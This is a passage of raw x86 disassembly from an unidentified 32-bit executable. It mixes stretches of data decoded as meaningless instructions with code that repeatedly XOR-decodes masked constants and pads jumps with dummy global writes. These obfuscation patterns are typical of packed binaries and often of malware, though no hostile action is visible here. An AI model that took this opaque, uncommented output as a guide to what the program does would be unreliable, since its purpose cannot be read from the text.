  420dee:	xchg   ebx,eax
  420def:	xchg   esp,eax
  420df0:	into   
  420df1:	dec    esi
  420df2:	fisub  WORD PTR [ecx+ebp*1-0x6f]
  420df6:	dec    esp
  420df7:	and    al,0x4c
  420df9:	push   edx
  420dfa:	mov    cl,0x16
  420dfc:	dec    esi
  420dfd:	and    ebp,esp
  420dff:	lock sbb ah,ch
  420e02:	cmc    
  420e03:	mov    ch,0x77
  420e05:	mov    ?,WORD PTR [edx]
  420e07:	adc    bl,bl
  420e09:	push   edi
  420e0a:	mov    edi,0xf48bda81
  420e0f:	daa    
  420e10:	jne    0x420dd6
  420e12:	mov    esi,DWORD PTR [edi+eax*8]
  420e15:	arpl   WORD PTR [edx+ebx*1-0x3a],cx
  420e19:	push   eax
  420e1a:	cmc    
  420e1b:	sbb    esi,DWORD PTR [esi+0x2b]
  420e1e:	(bad)  
  420e1f:	push   eax
  420e20:	loop   0x420e00
  420e22:	mov    eax,ds:0xaf2227ea
  420e27:	arpl   WORD PTR [edx-0x7ff7f2bb],di
  420e2d:	fimul  DWORD PTR [esi]
  420e2f:	pop    esp
  420e30:	cmp    eax,0xd2764754
  420e35:	mov    ecx,0x3c898be3
  420e3a:	fld    st(7)
  420e3c:	xchg   BYTE PTR [edi-0x37d351c1],dl
  420e42:	or     eax,0xb5d8d16f
  420e47:	(bad)  [eax-0x4b365d2b]
  420e4d:	imul   eax,DWORD PTR [ebx],0xced07e94
  420e53:	adc    al,0x89
  420e55:	ficomp WORD PTR [ebx]
  420e57:	dec    edx
  420e58:	sub    edx,0x29ad
  420e5e:	mov    esi,DWORD PTR ds:0x4281eb
  420e64:	sbb    DWORD PTR ds:0x4283df,esi
  420e6a:	imul   edx,eax
  420e6d:	cmp    DWORD PTR ds:0x4283fb,0x0
  420e74:	mov    DWORD PTR ds:0x4282b3,ebx
  420e7a:	mov    DWORD PTR ds:0x4281eb,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x4281df
  420e8e:	mov    DWORD PTR ds:0x4282c3,0x776f
  420e98:	cmp    DWORD PTR ds:0x4283fb,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x428297
  420eaa:	push   0x4280ff
  420eaf:	call   DWORD PTR ds:0x428eb8
  420eb5:	add    ecx,DWORD PTR ds:0x4283f7
  420ebb:	xor    esi,DWORD PTR ds:0x42828f
  420ec1:	adc    DWORD PTR ds:0x4282e7,edx
  420ec7:	xor    DWORD PTR ds:0x42836f,edx
  420ecd:	mov    esi,DWORD PTR ds:0x42829b
  420ed3:	or     esi,DWORD PTR ds:0x4281f7
  420ed9:	mov    DWORD PTR ds:0x42829b,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x4282cf
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x4281b7
  420eef:	sbb    eax,DWORD PTR ds:0x42836b
  420ef5:	mov    ds:0x4281b7,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x428267
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x4283bf
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x42836f,0x0
  420f23:	mov    DWORD PTR ds:0x428303,0x1362
  420f2d:	mov    DWORD PTR ds:0x4282b3,edx
  420f33:	mov    DWORD PTR ds:0x4282ef,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x4283d3,0xeb5
  420f48:	cmp    DWORD PTR ds:0x42836f,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428f30
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x42823f
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x42824b
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x4282c7,ecx
  420f81:	mov    edx,DWORD PTR ds:0x4282bf
  420f87:	sbb    edx,DWORD PTR ds:0x428407
  420f8d:	mov    DWORD PTR ds:0x4282bf,edx
  420f93:	add    DWORD PTR ds:0x4281fb,ecx
  420f99:	sub    DWORD PTR ds:0x4283eb,0x42835b
  420fa3:	cmp    DWORD PTR ds:0x4282e7,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x4283cb
  420fb0:	movzx  edx,BYTE PTR ds:0x4281d3
  420fb7:	mov    DWORD PTR ds:0x428357,0x5580
  420fc1:	mov    DWORD PTR ds:0x428403,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x428407,0x673a
  420fd6:	cmp    DWORD PTR ds:0x4282e7,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428dd4
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x428367
  421000:	sbb    DWORD PTR ds:0x4282e3,edx
  421006:	movzx  edx,WORD PTR ds:0x4281bb
  42100d:	or     edx,DWORD PTR ds:0x4283e3
  421013:	mov    DWORD PTR ds:0x4281bb,edx
  421019:	dec    DWORD PTR ds:0x4283d3
  42101f:	sub    DWORD PTR ds:0x4282df,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x4281cb,0x0
  421048:	mov    DWORD PTR ds:0x4283d7,0x62d9
  421052:	mov    DWORD PTR ds:0x4281b7,0x300d
  42105c:	mov    DWORD PTR ds:0x4281bb,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x42835f
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x4283cf,0x134d
  42107b:	cmp    DWORD PTR ds:0x4281cb,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428df4
  4210a1:	sbb    ecx,DWORD PTR ds:0x4282e3
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x428307,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x4281c3
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x422290
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x4213d3
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0xb7bc:0x65828d2a
  42115b:	or     BYTE PTR [edx],al
  42115d:	push   0xffffffc1
  42115f:	movhps xmm3,QWORD PTR [eax]
  421162:	inc    edi
  421163:	adc    al,0x18
  421165:	sbb    BYTE PTR [edi-0x64],al
  421168:	lds    ebp,FWORD PTR [eax]
  42116a:	das    
  42116b:	mov    dl,0xd0
  42116d:	mov    WORD PTR [edi+edi*8+0x3e03ac65],ss
  421174:	pop    ebx
  421175:	mov    ds:0x259b079c,al
  42117a:	cmp    al,0x18
  42117c:	pop    esp
  42117d:	xor    esp,DWORD PTR [eax]
  42117f:	cli    
  421180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421181:	or     eax,0xfcf39d7f
  421186:	xchg   cl,ah
  421188:	pop    esi
  421189:	loope  0x421184
  42118b:	lahf   
  42118c:	mov    WORD PTR [edx+0x718714ac],fs
  421192:	fisttp DWORD PTR [eax+edi*2]
  421195:	adc    eax,0xfb32d1d5
  42119a:	es mov dl,0xc0
  42119d:	retf   0xf83b
  4211a0:	fiadd  DWORD PTR [esi+0x57]
  4211a3:	scas   eax,DWORD PTR es:[edi]
  4211a4:	and    al,0xa4
  4211a6:	cmp    eax,0x96007547
  4211ab:	push   0x68e1b50c
  4211b0:	pop    ebx
  4211b1:	sbb    eax,0x39e608cd
  4211b6:	mov    eax,ds:0x9f0de886
  4211bb:	and    eax,0xd0fb01e3
  4211c0:	call   0xdf7a286a
  4211c5:	sahf   
  4211c6:	repz add edi,DWORD PTR [eax-0x7c72fd1e]
  4211cd:	and    al,0xc1
  4211cf:	loope  0x421225
  4211d1:	scas   al,BYTE PTR es:[edi]
  4211d2:	and    edi,0x6d
  4211d5:	or     DWORD PTR [edx+0x1b],esi
  4211d8:	add    eax,0xd1bbcaa6
  4211dd:	sbb    BYTE PTR [ecx+edx*2+0x5d],dh
  4211e1:	jmp    0x421244
  4211e3:	aad    0x31
  4211e5:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211e7:	cdq    
  4211e8:	add    dl,BYTE PTR [edx-0x50c9d27b]
  4211ee:	sub    edx,edi
  4211f0:	mov    edx,0xb63e618d
  4211f5:	sbb    BYTE PTR [esi],bl
  4211f7:	(bad)  
  4211f8:	dec    esi
  4211f9:	imul   BYTE PTR [ebx-0x1e3cf306]
  4211ff:	mov    eax,es
  421201:	ds add eax,0xc29474c6
  421207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421208:	outs   dx,BYTE PTR ds:[esi]
  421209:	test   eax,0x9ab16e0b
  42120e:	and    esi,DWORD PTR [edx-0x64]
  421211:	popa   
  421212:	or     BYTE PTR [edi-0x25],cl
  421215:	sahf   
  421216:	out    0x51,al
  421218:	int    0xdf
  42121a:	pop    edi
  42121b:	dec    eax
  42121c:	leave  
  42121d:	adc    esp,DWORD PTR [esi+edi*1-0x25557616]
  421224:	stos   DWORD PTR es:[edi],eax
  421225:	mov    ?,WORD PTR [edi]
  421227:	mov    DWORD PTR [edx-0x37a11560],edi
  42122d:	or     BYTE PTR [ebp-0x12658aa0],0xae
  421234:	xor    al,0x46
  421236:	dec    ecx
  421237:	jmp    0x4bb3:0x5df2adbb
  42123e:	mov    ds:0xc26c60ab,eax
  421243:	push   ss
  421244:	(bad)  
  421245:	arpl   WORD PTR ds:0x15effbe,si
  42124b:	into   
  42124c:	aam    0x51
  42124e:	test   BYTE PTR [edi],ah
  421250:	adc    ah,BYTE PTR [esi*1+0x61a5f22]
  421257:	ret    0x2ebe
  42125a:	ins    BYTE PTR es:[edi],dx
  42125b:	cli    
  42125c:	and    bh,al
  42125e:	jmp    0x6b05:0x9e0e7ea9
  421265:	cmp    BYTE PTR [edx+0x26],ah
  421268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421269:	loopne 0x421249
  42126b:	and    dh,BYTE PTR [edx+0x648aa5fa]
  421271:	inc    edx
  421272:	loope  0x421256
  421274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421275:	sahf   
  421276:	xlat   BYTE PTR ds:[ebx]
  421277:	lsl    eax,WORD PTR [esi]
  42127a:	jnp    0x421249
  42127c:	(bad)  
  42127d:	ds mov WORD PTR ds:[edx+0x2867d99b],ss
  421285:	cmp    al,0xff
  421287:	adc    al,0xc
  421289:	pop    esi
  42128a:	xchg   DWORD PTR [esi+0x34ade247],ebp
  421290:	push   eax
  421291:	retf   0x3e0f
  421294:	push   esi
  421295:	jae    0x42129f
  421297:	lahf   
  421298:	mov    edx,esp
  42129a:	pop    ebp
  42129b:	retf   
  42129c:	in     al,dx
  42129d:	add    DWORD PTR [ecx+0x6b],ebp
  4212a0:	ins    DWORD PTR es:[edi],dx
  4212a1:	test   BYTE PTR [edx+eax*2+0x55],0xde
  4212a6:	pop    ss
  4212a7:	dec    edi
  4212a8:	mov    ah,0x93
  4212aa:	mov    esp,0x6dd34c64
  4212af:	aas    
  4212b0:	rcl    BYTE PTR [ebp-0x79705e5c],1
  4212b6:	les    eax,FWORD PTR [ebp+ebp*1-0x4ec96796]
  4212bd:	xor    bh,BYTE PTR [edi-0x2f]
  4212c0:	sub    al,0xb3
  4212c2:	stos   DWORD PTR es:[edi],eax
  4212c3:	ret    
  4212c4:	test   eax,0xeb787a1b
  4212c9:	in     al,0xe3
  4212cb:	lods   eax,DWORD PTR ds:[esi]
  4212cc:	push   es
  4212cd:	fldz   
  4212cf:	dec    edx
  4212d0:	dec    ebx
  4212d1:	dec    eax
  4212d2:	loope  0x42134d
  4212d4:	ficom  WORD PTR [edx+0xe4e8cff]
  4212da:	retf   0x6942
  4212dd:	nop
  4212de:	fbld   TBYTE PTR [ebp-0x349c0993]
  4212e4:	adc    eax,0x5319f117
  4212e9:	aas    
  4212ea:	ds jg  0x42128e
  4212ed:	(bad)  
  4212ee:	sub    esi,ecx
  4212f0:	fild   WORD PTR [ecx+0x7c]
  4212f3:	dec    esi
  4212f4:	cdq    
  4212f5:	xchg   ecx,eax
  4212f6:	(bad)  
  4212f7:	pusha  
  4212f8:	shl    DWORD PTR [eax],0x49
  4212fb:	or     ch,dh
  4212fd:	push   0x32def9ba
  421302:	jle    0x42137d
  421304:	ins    DWORD PTR es:[edi],dx
  421305:	out    dx,eax
  421306:	and    DWORD PTR [ebx-0xc],ebp
  421309:	mov    edx,0x4078a852
  42130e:	rcr    DWORD PTR [eax],0x1a
  421311:	mov    esi,0x49f35c5d
  421316:	bound  ebx,QWORD PTR [ebx+0x4dd5e360]
  42131c:	xchg   edi,eax
  42131d:	aas    
  42131e:	repz or ebx,DWORD PTR [esi+0x15]
  421322:	arpl   WORD PTR fs:[edi+0x55],dx
  421326:	push   edx
  421327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421328:	es inc edx
  42132a:	lock add esp,0xffffffac
  42132e:	pop    edi
  42132f:	in     eax,dx
  421330:	out    0x5e,al
  421332:	xchg   ecx,eax
  421333:	dec    esp
  421334:	dec    ecx
  421335:	repnz dec eax
  421337:	hlt    
  421338:	(bad)  
  421339:	int    0x6c
  42133b:	xor    edx,ebx
  42133d:	xchg   ebx,eax
  42133e:	inc    ebx
  42133f:	ret    
  421340:	or     ah,bh
  421342:	pop    esp
  421343:	xchg   edx,eax
  421344:	test   eax,0x27e6f09b
  421349:	sbb    bh,0x9a
  42134c:	test   eax,0x3e82c7a6
  421351:	pusha  
  421352:	add    DWORD PTR [ecx],ebx
  421354:	jae    0x4213bd
  421356:	or     dh,0x97
  421359:	(bad)  
  42135a:	mov    ds:0x2b457f3e,eax
  42135f:	sub    al,0xf6
  421361:	add    BYTE PTR [ecx],bh
  421363:	xor    DWORD PTR [eax],0xb2531f70
  421369:	add    BYTE PTR [eax-0x3e],dl
  42136c:	in     eax,0x5
  42136e:	in     eax,dx
  42136f:	mov    cl,0xed
  421371:	sub    ebx,DWORD PTR [eax-0x80]
  421374:	xchg   edi,eax
  421375:	fstp   DWORD PTR [esp+edx*4]
  421378:	icebp  
  421379:	cmp    eax,0x1c40c009
  42137e:	cmp    al,0xa6
  421380:	into   
  421381:	(bad)  [esi-0x6ad8474f]
  421387:	push   cs
  421388:	and    ebx,DWORD PTR [eax-0x64e343b3]
  42138e:	xor    al,0x60
  421390:	loop   0x42136f
  421392:	or     eax,0x4fa79cb6
  421397:	out    dx,al
  421398:	jge    0x42137d
  42139a:	pop    edx
  42139b:	js     0x4213c8
  42139d:	pop    esi
  42139e:	jo     0x421406
  4213a0:	fsubr  DWORD PTR [eax+eiz*2+0x39]
  4213a4:	mov    ss,eax
  4213a6:	and    BYTE PTR [esi],ch
  4213a8:	mov    esp,0x76481140
  4213ad:	pushf  
  4213ae:	pop    ss
  4213af:	and    DWORD PTR [edx-0x2ee17c9a],esi
  4213b5:	inc    esp
  4213b6:	pop    ebp
  4213b7:	enter  0xba04,0x8d
  4213bb:	jo     0x421377
  4213bd:	imul   ebx,DWORD PTR [edi+0xc],0x71
  4213c1:	xchg   BYTE PTR [ebx-0x7fc6a35],ch
  4213c7:	retf   0x4306
  4213ca:	test   al,0xec
  4213cc:	or     dh,ah
  4213ce:	(bad)  
  4213cf:	mov    ebx,0x8b185d19
  4213d4:	test   DWORD PTR [esi+edi*8-0x6a740001],esp
  4213db:	test   al,0xfe
  4213dd:	(bad)  
  4213de:	push   DWORD PTR ds:0xca79a575
  4213e4:	xor    edx,0x9c1b89e8
  4213ea:	mov    cl,0x2
  4213ec:	call   0x40a9b5
  4213f1:	mov    ecx,edx
  4213f3:	mov    edx,DWORD PTR [ebp-0x15c]
  4213f9:	mov    DWORD PTR [ebp-0x218],esi
  4213ff:	mov    esi,DWORD PTR [ebp-0x158]
  421405:	xor    edx,0xca79a575
  42140b:	xor    esi,0x9c1b89e8
  421411:	mov    DWORD PTR [ebp-0x21c],eax
  421417:	mov    eax,edx
  421419:	mov    edx,esi
  42141b:	mov    DWORD PTR [ebp-0x220],ecx
  421421:	mov    cl,0x3e
  421423:	call   0x422290
  421428:	mov    esi,DWORD PTR [ebp-0x21c]
  42142e:	or     esi,eax
  421430:	mov    eax,DWORD PTR [ebp-0x220]
  421436:	or     eax,edx
  421438:	push   eax
  421439:	push   esi
  42143a:	push   ebx
  42143b:	push   edi
  42143c:	call   0x416c20
  421441:	mov    esi,DWORD PTR [ebp-0x218]
  421447:	cmp    esi,eax
  421449:	jne    0x4214ff
  42144f:	mov    eax,DWORD PTR [ebp-0x154]
  421455:	mov    edx,DWORD PTR [ebp-0x150]
  42145b:	xor    eax,0xca79a575
  421460:	xor    edx,0x9c1b89e8
  421466:	mov    cl,0x2
  421468:	call   0x40a9b5
  42146d:	mov    esi,eax
  42146f:	mov    edi,edx
  421471:	mov    eax,DWORD PTR [ebp-0x154]
  421477:	mov    edx,DWORD PTR [ebp-0x150]
  42147d:	xor    eax,0xca79a575
  421482:	xor    edx,0x9c1b89e8
  421488:	mov    cl,0x3e
  42148a:	call   0x422290
  42148f:	or     esi,eax
  421491:	or     edi,edx
  421493:	mov    eax,DWORD PTR [ebp-0x15c]
  421499:	mov    edx,DWORD PTR [ebp-0x158]
  42149f:	xor    eax,0xca79a575
  4214a4:	xor    edx,0x9c1b89e8
  4214aa:	mov    cl,0x2
  4214ac:	call   0x40a9b5
  4214b1:	mov    ebx,eax
  4214b3:	mov    eax,edx
  4214b5:	mov    ecx,DWORD PTR [ebp-0x15c]
  4214bb:	mov    edx,DWORD PTR [ebp-0x158]
  4214c1:	xor    ecx,0xca79a575
  4214c7:	xor    edx,0x9c1b89e8
  4214cd:	mov    DWORD PTR [ebp-0x224],eax
  4214d3:	mov    eax,ecx
  4214d5:	mov    cl,0x3e
  4214d7:	call   0x422290
  4214dc:	or     ebx,eax
  4214de:	mov    eax,DWORD PTR [ebp-0x224]
  4214e4:	or     eax,edx
  4214e6:	push   eax
  4214e7:	push   ebx
  4214e8:	push   edi
  4214e9:	push   esi
  4214ea:	call   0x416c20
  4214ef:	mov    DWORD PTR [ebp-0x178],eax
  4214f5:	jmp    0x4217bf
  4214fa:	jmp    0x421775
  4214ff:	lea    eax,[ebp-0x168]
  421505:	mov    DWORD PTR [ebp-0x164],eax
  42150b:	mov    eax,DWORD PTR [ebp-0x164]
  421511:	mov    DWORD PTR [eax],0xa4069aae
  421517:	mov    eax,DWORD PTR [ebp-0x168]
  42151d:	xor    eax,0xa4069aae
  421522:	shr    eax,0x2
  421525:	mov    ecx,DWORD PTR [ebp-0x168]
  42152b:	xor    ecx,0xa4069aae
  421531:	shl    ecx,0x1e
  421534:	or     eax,ecx
  421536:	mov    ecx,DWORD PTR [ebp-0x174]
  42153c:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  421540:	mov    DWORD PTR [ebp-0x160],eax
  421546:	mov    esi,DWORD PTR [ebp-0x160]
  42154c:	mov    eax,DWORD PTR [ebp-0x154]
  421552:	mov    edx,DWORD PTR [ebp-0x150]
  421558:	xor    eax,0xca79a575
  42155d:	xor    edx,0x9c1b89e8
  421563:	mov    cl,0x2
  421565:	call   0x40a9b5
  42156a:	mov    edi,eax
  42156c:	mov    ebx,edx
  42156e:	mov    eax,DWORD PTR [ebp-0x154]
  421574:	mov    edx,DWORD PTR [ebp-0x150]
  42157a:	xor    eax,0xca79a575
  42157f:	xor    edx,0x9c1b89e8
  421585:	mov    cl,0x3e
  421587:	call   0x422290
  42158c:	or     edi,eax
  42158e:	or     ebx,edx
  421590:	mov    eax,DWORD PTR [ebp-0x15c]
  421596:	mov    edx,DWORD PTR [ebp-0x158]
  42159c:	xor    eax,0xca79a575
  4215a1:	xor    edx,0x9c1b89e8
  4215a7:	mov    cl,0x2
  4215a9:	call   0x40a9b5
  4215ae:	mov    ecx,edx
  4215b0:	mov    edx,DWORD PTR [ebp-0x15c]
  4215b6:	mov    DWORD PTR [ebp-0x228],esi
  4215bc:	mov    esi,DWORD PTR [ebp-0x158]
  4215c2:	xor    edx,0xca79a575
  4215c8:	xor    esi,0x9c1b89e8
  4215ce:	mov    DWORD PTR [ebp-0x22c],eax
  4215d4:	mov    eax,edx
  4215d6:	mov    edx,esi
  4215d8:	mov    DWORD PTR [ebp-0x230],ecx
  4215de:	mov    cl,0x3e
  4215e0:	call   0x422290
  4215e5:	mov    esi,DWORD PTR [ebp-0x22c]
  4215eb:	or     esi,eax
  4215ed:	mov    eax,DWORD PTR [ebp-0x230]
  4215f3:	or     eax,edx
  4215f5:	push   eax
  4215f6:	push   esi
  4215f7:	push   ebx
  4215f8:	push   edi
  4215f9:	call   0x416c20
  4215fe:	mov    esi,DWORD PTR [ebp-0x228]
  421604:	cmp    esi,eax
  421606:	je     0x42167b
  42160c:	mov    eax,DWORD PTR [ebp-0x154]
  421612:	mov    edx,DWORD PTR [ebp-0x150]
  421618:	xor    eax,0xca79a575
  42161d:	xor    edx,0x9c1b89e8
  421623:	mov    cl,0x2
  421625:	call   0x40a9b5
  42162a:	mov    esi,eax
  42162c:	mov    edi,edx
  42162e:	mov    eax,DWORD PTR [ebp-0x154]
  421634:	mov    edx,DWORD PTR [ebp-0x150]
  42163a:	xor    eax,0xca79a575
  42163f:	xor    edx,0x9c1b89e8
  421645:	mov    cl,0x3e
  421647:	call   0x422290
  42164c:	or     esi,eax
  42164e:	or     edi,edx
  421650:	mov    eax,DWORD PTR [ebp-0x160]
  421656:	imul   esi,eax
  421659:	add    esi,DWORD PTR [ebp-0x170]
  42165f:	mov    DWORD PTR [ebp-0x16c],esi
  421665:	mov    eax,DWORD PTR [ebp-0x16c]
  42166b:	mov    DWORD PTR [ebp-0x178],eax
  421671:	jmp    0x4217bf
  421676:	jmp    0x421726
  42167b:	mov    eax,DWORD PTR [ebp-0x154]
  421681:	mov    edx,DWORD PTR [ebp-0x150]
  421687:	xor    eax,0xca79a575
  42168c:	xor    edx,0x9c1b89e8
  421692:	mov    cl,0x2
  421694:	call   0x40a9b5
  421699:	mov    esi,eax
  42169b:	mov    edi,edx
  42169d:	mov    eax,DWORD PTR [ebp-0x154]
  4216a3:	mov    edx,DWORD PTR [ebp-0x150]
  4216a9:	xor    eax,0xca79a575
  4216ae:	xor    edx,0x9c1b89e8
  4216b4:	mov    cl,0x3e
  4216b6:	call   0x422290
  4216bb:	or     esi,eax
  4216bd:	or     edi,edx
  4216bf:	mov    eax,DWORD PTR [ebp-0x15c]
  4216c5:	mov    edx,DWORD PTR [ebp-0x158]
  4216cb:	xor    eax,0xca79a575
  4216d0:	xor    edx,0x9c1b89e8
  4216d6:	mov    cl,0x2
  4216d8:	call   0x40a9b5
  4216dd:	mov    ebx,eax
  4216df:	mov    eax,edx
  4216e1:	mov    ecx,DWORD PTR [ebp-0x15c]
  4216e7:	mov    edx,DWORD PTR [ebp-0x158]
  4216ed:	xor    ecx,0xca79a575
  4216f3:	xor    edx,0x9c1b89e8
  4216f9:	mov    DWORD PTR [ebp-0x234],eax
  4216ff:	mov    eax,ecx
  421701:	mov    cl,0x3e
  421703:	call   0x422290
  421708:	or     ebx,eax
  42170a:	mov    eax,DWORD PTR [ebp-0x234]
  421710:	or     eax,edx
  421712:	push   eax
  421713:	push   ebx
  421714:	push   edi
  421715:	push   esi
  421716:	call   0x416c20
  42171b:	mov    DWORD PTR [ebp-0x178],eax
  421721:	jmp    0x4217bf
  421726:	mov    eax,DWORD PTR [ebp-0x15c]
  42172c:	mov    edx,DWORD PTR [ebp-0x158]
  421732:	xor    eax,0xca79a575
  421737:	xor    edx,0x9c1b89e8
  42173d:	mov    cl,0x2
  42173f:	call   0x40a9b5
  421744:	mov    esi,eax
  421746:	mov    edi,edx
  421748:	mov    eax,DWORD PTR [ebp-0x15c]
  42174e:	mov    edx,DWORD PTR [ebp-0x158]
  421754:	xor    eax,0xca79a575
  421759:	xor    edx,0x9c1b89e8
  42175f:	mov    cl,0x3e
  421761:	call   0x422290
  421766:	or     esi,eax
  421768:	or     edi,edx
  42176a:	mov    DWORD PTR [ebp-0x178],esi
  421770:	jmp    0x4217bf
  421775:	mov    eax,DWORD PTR [ebp-0x15c]
  42177b:	mov    edx,DWORD PTR [ebp-0x158]
  421781:	xor    eax,0xca79a575
  421786:	xor    edx,0x9c1b89e8
  42178c:	mov    cl,0x2
  42178e:	call   0x40a9b5
  421793:	mov    esi,eax
  421795:	mov    edi,edx
  421797:	mov    eax,DWORD PTR [ebp-0x15c]
  42179d:	mov    edx,DWORD PTR [ebp-0x158]
  4217a3:	xor    eax,0xca79a575
  4217a8:	xor    edx,0x9c1b89e8
  4217ae:	mov    cl,0x3e
  4217b0:	call   0x422290
  4217b5:	or     esi,eax
  4217b7:	or     edi,edx
  4217b9:	mov    DWORD PTR [ebp-0x178],esi
  4217bf:	mov    ecx,DWORD PTR [ebp-0xd8]
  4217c5:	mov    eax,0x459a
  4217ca:	xor    edx,edx
  4217cc:	div    ecx
  4217ce:	mov    ecx,DWORD PTR [ebp-0xdc]
  4217d4:	and    eax,ecx
  4217d6:	add    eax,DWORD PTR [ebp-0x44]
  4217d9:	mov    ecx,DWORD PTR [ebp-0xe0]
  4217df:	lea    eax,[eax+ecx*1+0x272f]
  4217e6:	xor    eax,0x1080c
  4217eb:	add    eax,DWORD PTR [ebp-0x178]
  4217f1:	mov    DWORD PTR [ebp-0xe8],eax
  4217f7:	mov    DWORD PTR [ebp-0xc],0x5950
  4217fe:	mov    DWORD PTR [ebp-0xf8],0x4964
  421808:	mov    DWORD PTR [ebp-0x130],0x3
  421812:	mov    DWORD PTR [ebp-0x20],0x2df9
  421819:	mov    DWORD PTR [ebp-0x8],0x4524
  421820:	mov    DWORD PTR [ebp-0xd4],0x637e
  42182a:	mov    DWORD PTR [ebp-0x110],0x38c8
  421834:	mov    DWORD PTR [ebp-0xa4],0x7118
  42183e:	mov    DWORD PTR [ebp-0xa0],0xaf6
  421848:	mov    DWORD PTR [ebp-0x10c],0x3315
  421852:	mov    eax,DWORD PTR [ebp-0xf8]
  421858:	mov    ecx,DWORD PTR [ebp-0x130]
  42185e:	xor    edx,edx
  421860:	div    ecx
  421862:	add    eax,0x454e
  421867:	mov    ecx,DWORD PTR [ebp-0xc]
  42186a:	and    eax,ecx
  42186c:	xor    eax,0x5940
  421871:	add    eax,DWORD PTR [ebp+0x8]
  421874:	mov    ecx,DWORD PTR [ebp-0x110]
  42187a:	mov    edx,DWORD PTR [ebp-0xa4]
  421880:	sub    ecx,edx
  421882:	mov    edx,DWORD PTR [ebp-0xd4]
  421888:	or     ecx,edx
  42188a:	mov    edx,DWORD PTR [ebp-0x8]
  42188d:	and    ecx,edx
  42188f:	mov    edx,DWORD PTR [ebp-0x20]
  421892:	xor    ecx,edx
  421894:	mov    edx,DWORD PTR [ebp-0x10c]
  42189a:	mov    esi,0x180f
  42189f:	sub    esi,edx
  4218a1:	mov    edx,DWORD PTR [ebp-0xa0]
  4218a7:	imul   esi,edx
  4218aa:	xor    esi,0x402b
  4218b0:	xor    esi,0xfed78c17
  4218b6:	mov    edx,DWORD PTR [ebp-0xe8]
  4218bc:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  4218c3:	add    ecx,eax
  4218c5:	add    esi,ecx
  4218c7:	mov    DWORD PTR [ebp-0x38],esi
  4218ca:	mov    DWORD PTR [ebp-0x4],0x59a8
  4218d1:	mov    DWORD PTR [ebp-0x30],0x7021
  4218d8:	mov    DWORD PTR [ebp-0xf4],0x6210
